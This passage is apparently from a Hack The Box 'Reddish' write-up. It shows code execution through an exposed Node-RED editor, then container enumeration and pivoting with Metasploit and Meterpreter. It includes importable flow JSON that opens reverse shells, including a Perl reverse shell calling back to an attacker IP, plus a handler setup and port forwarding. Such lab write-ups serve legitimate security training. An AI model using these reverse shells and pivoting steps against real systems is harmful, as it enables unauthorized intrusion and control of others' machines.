<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># curl -X POST http://10.10.10.94:1880</span></span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;96752a0580c49f0f90f8977d70fe318c&quot;</span>,<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;::ffff:10.10.14.5&quot;</span>,<span class="string">&quot;path&quot;</span>:<span class="string">&quot;/red/&#123;id&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>this may gave me a new path to try, let’s visit following url:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.10.10.94:1880/red/96752a0580c49f0f90f8977d70fe318c</span><br></pre></td></tr></table></figure>
<p>On visiting that path, now in the Node-Red editor:</p>
<p>The editor has items grouped as “input”, “output”, “function”, “social”, “storage”, “analysis”, and “advanced”. Clicking on any given item will load a description of the item in the panel on the right.</p>
<p>Items can be dragged into the center pane, and connected with wires. Once my flow is complete, I’ll hit “Deploy”, and the flow is live. Some inputs also have a button on their left side. That item will generate its output when the button is pressed. For example, this “inject” will output a timestamp when the button is pressed.</p>
<h3 id="Code-Execution-and-getShell-in-Node-Red"><a href="#Code-Execution-and-getShell-in-Node-Red" class="headerlink" title="Code Execution and getShell in Node-Red"></a>Code Execution and getShell in Node-Red</h3><p>In playing around with the editor, built a few useful flows that will help with exploitation of Reddish. Flows show up nicely as images, but can also be imported/exported in json. Just go to the menu, import, clipboard, and paste in the json.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb47.jpg"></li>
</ul>
<p>It will initiate the connection when the the flow to output &gt; is sent to stdin of the tcp connection. The TCP connection will come back to me. Then whatever I send back is sent to exec. The output of that is formatted and a prompt is added, and then sent back into the TCP connection, where I’ll receive it. Here’s the export:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tab&quot;</span>,<span class="string">&quot;label&quot;</span>:<span class="string">&quot;Shell&quot;</span>,<span class="string">&quot;disabled&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;info&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;9754e73a.fb7f5&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tcp request&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;server&quot;</span>:<span class="string">&quot;10.10.14.9&quot;</span>,<span class="string">&quot;port&quot;</span>:<span class="string">&quot;9001&quot;</span>,<span class="string">&quot;out&quot;</span>:<span class="string">&quot;sit&quot;</span>,<span class="string">&quot;splitc&quot;</span>:<span class="string">&quot; &quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;x&quot;</span>:520,<span class="string">&quot;y&quot;</span>:80,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;df9367ea.2fd12&quot;</span>]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;df9367ea.2fd12&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;addpay&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;append&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;useSpawn&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;timer&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;oldrc&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;x&quot;</span>:170,<span class="string">&quot;y&quot;</span>:240,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;7cd3aeef.1a522&quot;</span>],[<span class="string">&quot;7cd3aeef.1a522&quot;</span>],[]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6a48f346.ccad1c&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;inject&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;payloadType&quot;</span>:<span class="string">&quot;str&quot;</span>,<span class="string">&quot;repeat&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;crontab&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;once&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;onceDelay&quot;</span>:0.1,<span class="string">&quot;x&quot;</span>:191.5,<span class="string">&quot;y&quot;</span>:50,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;9754e73a.fb7f5&quot;</span>]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;7cd3aeef.1a522&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;template&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;3f7824bc.483a94&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;results + prompt&quot;</span>,<span class="string">&quot;field&quot;</span>:<span class="string">&quot;payload&quot;</span>,<span class="string">&quot;fieldType&quot;</span>:<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;format&quot;</span>:<span class="string">&quot;handlebars&quot;</span>,<span class="string">&quot;syntax&quot;</span>:<span class="string">&quot;mustache&quot;</span>,<span class="string">&quot;template&quot;</span>:<span class="string">&quot;&#123;&#123;&#123;payload&#125;&#125;&#125;\n&gt; &quot;</span>,<span class="string">&quot;output&quot;</span>:<span class="string">&quot;str&quot;</span>,<span class="string">&quot;x&quot;</span>:440,<span class="string">&quot;y&quot;</span>:240,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;9754e73a.fb7f5&quot;</span>]]&#125;]</span><br></pre></td></tr></table></figure>

<p>first import the commads then deploy it and click the button , then i recive a shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># nc -lvp 9001</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:39270.</span><br><span class="line">&gt; id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">&gt; whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="Callback-Shell"><a href="#Callback-Shell" class="headerlink" title="Callback Shell"></a>Callback Shell</h3><p>In investigating the box, it’s incredibly bare: no python, python3, php, nc, ifconfig, netstat, arp. There is perl though.</p>
<p>I’ll use the perl reverse shell from </p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NoZWxscy9yZXZlcnNlLXNoZWxsLWNoZWF0LXNoZWV0">PentestMonkey<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>to get a proper callback shell. The exec node runs a command. In this case, I’ll configure it to take input for the port, which is inserted into the middle of the command:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb48.jpg"></li>
</ul>
<p>looks like:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb49.jpg"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tab&quot;</span>,<span class="string">&quot;label&quot;</span>:<span class="string">&quot;Reverse_TCP&quot;</span>,<span class="string">&quot;disabled&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;info&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6caeb9ad.e39468&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;inject&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;9002&quot;</span>,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;9002&quot;</span>,<span class="string">&quot;payloadType&quot;</span>:<span class="string">&quot;str&quot;</span>,<span class="string">&quot;repeat&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;crontab&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;once&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;onceDelay&quot;</span>:0.1,<span class="string">&quot;x&quot;</span>:150,<span class="string">&quot;y&quot;</span>:160,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;97f946aa.853548&quot;</span>]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;97f946aa.853548&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;perl -e &#x27;use Socket;<span class="variable">$i</span>=\&quot;10.10.14.9\&quot;;<span class="variable">$p</span>=&quot;</span>,<span class="string">&quot;addpay&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;append&quot;</span>:<span class="string">&quot;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);&#125;;&#x27;&quot;</span>,<span class="string">&quot;useSpawn&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;timer&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;oldrc&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;perl rev shell&quot;</span>,<span class="string">&quot;x&quot;</span>:350,<span class="string">&quot;y&quot;</span>:160,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;e2dba6a9.bb9fe8&quot;</span>],[<span class="string">&quot;e2dba6a9.bb9fe8&quot;</span>],[]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;e2dba6a9.bb9fe8&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;debug&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;active&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;tosidebar&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;console&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;tostatus&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;complete&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;x&quot;</span>:570,<span class="string">&quot;y&quot;</span>:160,<span class="string">&quot;wires&quot;</span>:[]&#125;]</span><br></pre></td></tr></table></figure>

<p>first import the commads then deploy it and click the button , then i recive a shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9002</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9002</span><br><span class="line">Ncat: Listening on 0.0.0.0:9002</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:46916.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>

<h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>Since the box doesn’t have curl or wget or nc, created a file upload flow, that would callback to a given port, and then what it reads to /tmp/.df/upload:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb50.jpg"></li>
</ul>
<p>The string “9003” is not used by the TCP node, just there because needed something, and it was a good visual reminder as to what port the flow expected.</p>
<h2 id="nodered-Container"><a href="#nodered-Container" class="headerlink" title="nodered Container"></a>nodered Container</h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a>Local Enumeration</h3><p>The local box is quite bare. I’m already running as root. As mentioned before, almost none of programs I’d expect on a linux host are present. Also, none of the IP addresses match 10.10.10.94:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip addr</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                 </span><br><span class="line">    inet 127.0.0.1/8 scope host lo                                                                                 </span><br><span class="line">       valid_lft forever preferred_lft forever                                                                       </span><br><span class="line">7: eth1@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default                              </span><br><span class="line">    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff                                                                        </span><br><span class="line">    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth1                                                                     </span><br><span class="line">       valid_lft forever preferred_lft forever                                                                                      </span><br><span class="line">9: eth0@if10: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default                                          </span><br><span class="line">    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff                                                                                      </span><br><span class="line">    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0                                                                                        </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>conclude in a container, and didn’t find much else of interest in it.<br>Since in a container, start tracking what I know about it:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb51.jpg"></li>
</ul>
<h3 id="Network-Enumeration"><a href="#Network-Enumeration" class="headerlink" title="Network Enumeration"></a>Network Enumeration</h3><p>It’s fairly clear I need to move outside this container, and since there’s no obvious path to the host, I’ll look around the environment.</p>
<ul>
<li>Check arp</li>
</ul>
<p>The arp cache shows only the two .1 ips, which are likely the host:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/net/arp</span></span><br><span class="line">IP address       HW <span class="built_in">type</span>     Flags       HW address            Mask     Device</span><br><span class="line">172.19.0.1       0x1         0x2         02:42:bc:00:fb:35     *        eth1</span><br><span class="line">172.18.0.1       0x1         0x2         02:42:de:ac:1d:ce     *        eth0</span><br></pre></td></tr></table></figure>

<ul>
<li>nmap Host</li>
</ul>
<p>uploaded a </p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FuZHJldy1kL3N0YXRpYy1iaW5hcmllcw==">statically compiled nmap<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>to check out the .1s:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.18.0.1</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 10:57 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.18.0.1</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1880/tcp open  unknown</span><br><span class="line">MAC Address: 02:42:1F:A4:77:C3 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.01 seconds</span><br><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.19.0.1</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 10:57 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.19.0.1</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">1880/tcp filtered unknown</span><br><span class="line">MAC Address: 02:42:F2:E9:5E:A1 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.98 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>Ping Sweep</li>
</ul>
<p>Next start a ping sweep to look for other hosts/containers, and find two other hosts worth looking at in the 172.19.0.0/24 subnet. Based on my current ifconfig and my assumption about the .1s being the gateway, I can label the output leaving two unknowns:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for i in $(seq 1 254); do (ping -c 1 172.18.0.$i | grep &quot;bytes from&quot; | cut -d&#x27;:&#x27; -f1 | cut -d&#x27; &#x27; -f4 &amp;); done</span></span><br><span class="line">172.18.0.1  &lt;-- host</span><br><span class="line">172.18.0.2  &lt;-- node-red container</span><br><span class="line"><span class="comment"># for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep &quot;bytes from&quot; | cut -d&#x27;:&#x27; -f1 | cut -d&#x27; &#x27; -f4 &amp;); done                    </span></span><br><span class="line">172.19.0.2</span><br><span class="line">172.19.0.1  &lt;-- host</span><br><span class="line">172.19.0.3  &lt;-- nodered container</span><br><span class="line">172.19.0.4</span><br></pre></td></tr></table></figure>

<p>got two new hosts to track:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb52.jpg"></li>
</ul>
<h2 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>There’s many ways to set up tunnels to allow my pivot here. A few that come to mind are:</p>
<ul>
<li><p>Get a meterpreter session with nodered, and use the portfwd capability to tunnel from my local box into the network (like ssh tunneling).</p>
</li>
<li><p>Copy an ssh client to nodered, and ssh back into my kali box with a reverse tunnel.</p>
</li>
<li><p>Build a listening interface (likely web) with NodeRed, and use that to tunnel traffic.</p>
</li>
<li><p>Using software designed for tunneling.</p>
</li>
</ul>
<h3 id="Getting-Meterpreter"><a href="#Getting-Meterpreter" class="headerlink" title="Getting Meterpreter"></a>Getting Meterpreter</h3><p>Open a handler with payload linux/x64/shell/reverse_tcp, and catch a callback from flow:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/shell/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  9002             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.14.9</span><br><span class="line">lhost =&gt; 10.10.14.9</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.9:9002 </span><br><span class="line">[*] Sending stage (38 bytes) to 10.10.10.94</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.9:9002 -&gt; 10.10.10.94:47014) at 2020-07-25 12:40:43 -0400</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">/bin/sh: 1: j^H��j!Xu�j: not found</span><br><span class="line">/bin/sh: 1: X�H�/bin/shSH��RWH��id: not found</span><br></pre></td></tr></table></figure>

<p>For some reason, the first command run in this new shell can be garbage and fail. After making sure to get that out of the way, I’ll background the session (ctrl-z):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># ^Z</span></span><br><span class="line">Background session 1? [y/N]  y</span><br></pre></td></tr></table></figure>
<p>Metasploit has a built in upgrade path to Meterpreter using sessions -u:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; sessions -u 1</span><br><span class="line">[*] Executing <span class="string">&#x27;post/multi/manage/shell_to_meterpreter&#x27;</span> on session(s): [1]</span><br><span class="line"></span><br><span class="line">[*] Upgrading session ID: 1</span><br><span class="line">[*] Starting exploit/multi/handler</span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.9:4433 </span><br><span class="line">[*] Sending stage (985320 bytes) to 10.10.10.94</span><br><span class="line">[*] Command stager progress: 100.00% (773/773 bytes)</span><br><span class="line">msf5 exploit(multi/handler) &gt; [*] Meterpreter session 2 opened (10.10.14.9:4433 -&gt; 10.10.10.94:50690) at 2020-07-25 12:41:29 -0400</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; </span><br><span class="line">[*] Stopping exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                   Information                                             Connection</span><br><span class="line">  --  ----  ----                   -----------                                             ----------</span><br><span class="line">  1         shell x64/linux        /bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off #  10.10.14.9:9002 -&gt; 10.10.10.94:47014 (10.10.10.94)</span></span><br><span class="line"><span class="string">  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 172.18.0.2               10.10.14.9:4433 -&gt; 10.10.10.94:50690 (172.18.0.2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 exploit(multi/handler) &gt; sessions -i 2</span></span><br><span class="line"><span class="string">[*] Starting interaction with 2...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="www-redis-Containers"><a href="#www-redis-Containers" class="headerlink" title="www redis Containers"></a>www redis Containers</h2><h3 id="Note-About-IPs"><a href="#Note-About-IPs" class="headerlink" title="Note About IPs"></a>Note About IPs</h3><p>One thing to note - on each reset / boot, Docker seems to randomize the IP addresses of the three containers, nodered, www, and redis. They always seem to be .2, .3, and .4, but which is which is something I need to determine each time. For the sake of this post, I’m working with redis as .2, nodered as .3, and www as .4.</p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>Get an nmap scan of these two new hosts:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.19.0.2</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 11:19 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> reddish_composition_redis_1.reddish_composition_internal-network (172.19.0.2)                                                                       </span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  unknown</span><br><span class="line">MAC Address: 02:42:AC:13:00:02 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.49 seconds</span><br><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.19.0.4</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 11:19 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> reddish_composition_www_1.reddish_composition_internal-network (172.19.0.3)                                                                         </span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 02:42:AC:13:00:03 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.39 seconds</span><br></pre></td></tr></table></figure>

<p>can see the docker names, reddish_composition_redis_1 and reddish_composition_www_1, and the listening ports which fit for each server, 6379 for redis, and 80 for www.</p>
<h3 id="Web-Site"><a href="#Web-Site" class="headerlink" title="Web Site"></a>Web Site</h3><ul>
<li>Access<br>I’ll use the meterpreter shell to port forward localhost 80 through the session to 172.19.0.3:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 80 -r 172.19.0.3 -p 80</span><br><span class="line">[*] Local TCP relay created: :80 &lt;-&gt; 172.19.0.3:80</span><br></pre></td></tr></table></figure>

<p>Visiting <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS8=">http://127.0.0.1/<i class="fa fa-external-link-alt"></i></span> gives the page:</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb53.jpg"></p>
</li>
<li><p>Javascript<br>Much more interesting than the displayed page is the javascript in the source:</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>/&gt;</span><br><span class="line">        &lt;title&gt;Reddish&lt;/title&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;assets/jquery.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">                        $(document).ready(<span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">                                incrCounter();</span><br><span class="line">                            getData();</span><br><span class="line">                        &#125;);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="function"><span class="title">getData</span></span>() &#123;</span><br><span class="line">                            $.ajax(&#123;</span><br><span class="line">                                url: <span class="string">&quot;8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits&quot;</span>,</span><br><span class="line">                                cache: <span class="literal">false</span>,</span><br><span class="line">                                dataType: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">                                success: <span class="keyword">function</span> (data) &#123;</span><br><span class="line">                                            console.log(<span class="string">&quot;Number of hits:&quot;</span>, data)</span><br><span class="line">                                &#125;,</span><br><span class="line">                                error: <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="function"><span class="title">incrCounter</span></span>() &#123;</span><br><span class="line">                            $.ajax(&#123;</span><br><span class="line">                                url: <span class="string">&quot;8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits&quot;</span>,</span><br><span 